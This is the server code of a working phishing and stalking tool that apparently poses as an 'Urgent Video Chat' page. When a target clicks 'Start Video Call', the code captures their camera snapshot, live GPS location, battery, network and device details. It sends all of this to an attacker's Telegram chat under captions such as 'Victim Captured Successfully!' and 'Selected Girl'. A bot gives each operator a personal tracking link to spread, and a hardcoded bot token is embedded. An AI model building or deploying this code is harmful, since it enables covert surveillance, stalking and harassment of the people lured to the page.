import express from 'express';
import path from 'path';

const app = express();
app.set('trust proxy', true);
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ limit: '15mb', extended: true }));
app.use(express.static(path.join(process.cwd())));

const DEFAULT_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8941251283:AAFDGIvRSkAHR0h1RYuMgt6-FfK-LZ3HUH0";
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7264141539";

function dataURItoBuffer(dataURI) {
  const matches = dataURI.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
  if (!matches || matches.length !== 3) {
    throw new Error('Invalid data URI');
  }
  return Buffer.from(matches[2], 'base64');
}

// Log endpoint: receives photo & location and sends to Telegram bot
app.post('/api/log', async (req, res) => {
  try {
    const { name, photo, lat, lon, acc, ref, status, isLocationUpdate, battery, network, device } = req.body;
    const targetChatId = ref || DEFAULT_CHAT_ID;
    const botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;

    const deviceInfoText = `📱 **Device:** ${device || 'Unknown'}\n🔋 **Battery:** ${battery || 'Unknown'}\n📶 **Network:** ${network || 'Unknown'}`;

    if (status === 'clicked') {
      const clickMsg = `⚡ **Instant Alert!**\n👤 User clicked Start Video Call for: *${name || 'Haleema'}*\n${deviceInfoText}\n🕒 Time: ${new Date().toLocaleString()}\n⏳ Capturing camera snapshot & GPS location...`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: targetChatId,
          text: clickMsg,
          parse_mode: 'Markdown'
        })
      });
      return res.json({ success: true, message: 'Click notified' });
    }

    if (isLocationUpdate && lat && lon) {
      const mapLink = `https://www.google.com/maps?q=${lat},${lon} (Accuracy: ${acc || 'Unknown'}m)`;
      const locMsg = `📍 **Live GPS Location Update:**\n👤 Victim: ${name || 'Haleema'}\n🗺️ ${mapLink}\n${deviceInfoText}\n🕒 Time: ${new Date().toLocaleString()}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: targetChatId,
          text: locMsg,
          parse_mode: 'Markdown'
        })
      });
      return res.json({ success: true, message: 'Location updated' });
    }

    const mapLink = (lat && lon) 
      ? `https://www.google.com/maps?q=${lat},${lon} (Accuracy: ${acc || 'Unknown'}m)` 
      : "Location loading or not available";

    const caption = `📸 **Victim Captured Successfully!**\n👤 Selected Girl: ${name || 'Haleema'}\n📍 Location: ${mapLink}\n${deviceInfoText}\n🕒 Time: ${new Date().toLocaleString()}`;

    if (photo) {
      try {
        const buffer = dataURItoBuffer(photo);
        const formData = new FormData();
        formData.append('chat_id', targetChatId);
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');
        
        const blob = new Blob([buffer], { type: 'image/jpeg' });
        formData.append('photo', blob, 'capture.jpg');

        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const tgData = await tgRes.json();
        console.log('Telegram sendPhoto response:', tgData);
      } catch (tgErr) {
        console.error('Error sending photo to Telegram:', tgErr);
      }
    }

    res.json({ success: true, message: 'Logged successfully' });
  } catch (err) {
    console.error('Error in /api/log:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// Telegram Webhook endpoint (/api/webhook)
app.post('/api/webhook', async (req, res) => {
  try {
    const update = req.body;
    const botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;

    if (update && update.message && update.message.text) {
      const chatId = update.message.chat.id;
      const text = update.message.text.trim();
      const firstName = update.message.from?.first_name || 'User';

      if (text.startsWith('/start')) {
        const host = req.get('host') || 'camhack.vercel.app';
        let protocol = req.protocol || 'https';
        if (host && host.includes('vercel.app')) {
          protocol = 'https';
        }
        const customLink = `${protocol}://${host}/?ref=${chatId}`;

        const welcomeMessage = `👋 Hello ${firstName}!\n\n✨ Welcome to Urgent Video Chat Bot.\n\n🔗 **Your Custom Tracking Link:**\n${customLink}\n\n📤 Share this link with anyone. When they open it and click "Start Video Call" (allowing camera & location), you will instantly receive their photo and live GPS location right here in this chat! 📸📍`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: welcomeMessage,
            parse_mode: 'Markdown'
          })
        });
      }
    }

    res.json({ status: 'ok' });
  } catch (err) {
    console.error('Webhook error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Auto-set webhook helper
app.get('/api/set-webhook', async (req, res) => {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
    const host = req.get('host');
    let protocol = req.protocol || 'https';
    if (host && host.includes('vercel.app')) {
      protocol = 'https';
    }
    const webhookUrl = `${protocol}://${host}/api/webhook`;

    const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
    const data = await response.json();
    res.json({ webhookUrl, result: data });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(process.cwd(), 'index.html'));
});

export default app;

if (process.env.NODE_ENV !== 'production' || process.env.LOCAL_RUN) {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}
